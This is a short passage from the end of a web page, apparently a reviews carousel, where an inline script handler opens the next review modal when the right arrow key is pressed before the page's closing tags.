                if (e.key === 'ArrowRight' && activeReviewModalIdx < REVIEWS_DATA.length - 1) abrirModalReview(activeReviewModalIdx + 1);
            }
        });
    </script>
</body>
</html>
